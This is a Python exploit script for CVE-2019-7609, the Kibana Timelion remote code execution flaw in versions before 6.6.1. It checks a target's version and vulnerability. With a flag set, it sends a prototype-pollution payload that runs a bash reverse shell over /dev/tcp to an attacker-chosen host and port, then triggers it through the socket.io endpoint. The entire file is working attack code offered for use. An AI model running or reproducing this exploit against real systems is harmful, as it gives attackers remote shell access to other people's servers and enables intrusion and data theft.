print("反弹shell, -h帮助")
import re
import sys
import time
import random
import argparse
import requests
import traceback
from distutils.version import StrictVersion


def get_kibana_version(url):
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    url = "{}{}".format(url.rstrip("/"), "/app/kibana")
    r = requests.get(url, verify=False, headers=headers, timeout=30)
    patterns = ['&quot;version&quot;:&quot;(.*?)&quot;,', '"version":"(.*?)",']
    for pattern in patterns:
        match = re.findall(pattern, r.content)
        if match:
            return match[0]
    return '9.9.9'


def version_compare(standard_version, compare_version):
    try:
        sc1 = StrictVersion(standard_version[0])
        sc2 = StrictVersion(standard_version[1])
        cc = StrictVersion(compare_version)
    except ValueError:
        print("[-] ERROR : kibana version compare failed !")
        return False

    if sc1 > cc or (StrictVersion("6.0.0") <= cc and sc2 > cc):
        return True
    return False


def verify(url):
    global version

    if not version or not version_compare(["5.6.15", "6.6.1"], version):
        return False
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': url,
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = '{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}'
    url = "{}{}".format(url.rstrip("/"), "/api/timelion/run")
    r = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    if r.status_code == 200 and 'application/json' in r.headers.get('content-type', '') and '"seriesList"' in r.content:
        return True
    else:
        return False


def reverse_shell(target, ip, port):
    random_name = "".join(random.sample('qwertyuiopasdfghjkl', 8))
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}''' % (
    random_name, random_name, ip, port)
    url = "{}{}".format(target, "/api/timelion/run")
    r1 = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    if r1.status_code == 200:
        trigger_url = "{}{}".format(target, "/socket.io/?EIO=3&transport=polling&t=MtjhZoM")
        new_headers = headers
        new_headers.update({'kbn-xsrf': 'professionally-crafted-string-of-text'})
        r2 = requests.get(trigger_url, verify=False, headers=new_headers, timeout=20)
        if r2.status_code == 200:
            time.sleep(5)
            return True
    return False


if __name__ == "__main__":
    start = time.time()

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest='url', default="http://127.0.0.1:5601", type=str,
                        help='such as: http://127.0.0.1:5601')
    parser.add_argument("-host", dest='remote_host', default="127.0.0.1", type=str,
                        help='reverse shell remote host: such as: 1.1.1.1')
    parser.add_argument("-port", dest='remote_port', default="8888", type=str,
                        help='reverse shell remote port: such as: 8888')
    parser.add_argument('--shell', dest='reverse_shell', default='', action="store_true",
                        help='reverse shell after verify, if want, type in True')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    target = args.url
    remote_host = args.remote_host
    remote_port = args.remote_port
    is_reverse_shell = args.reverse_shell

    target = target.rstrip('/')
    if "://" not in target:
        target = "http://" + target
    try:
        version = get_kibana_version(target)
        result = verify(target)
        if result:
            print("[+] {} maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability".format(target))
            if is_reverse_shell:
                result = reverse_shell(target, remote_host, remote_port)
                if result:
                    print(
                        "[+] reverse shell completely! please check session on: {}:{}".format(remote_host, remote_port))
                else:
                    print("[-] cannot reverse shell")
        else:
            print("[-] {} do not exists CVE-2019-7609 vulnerability".format(target))
    except Exception as e:
        print("[-] cannot exploit!")
        print("[-] Error on: \n")
        traceback.print_exc()
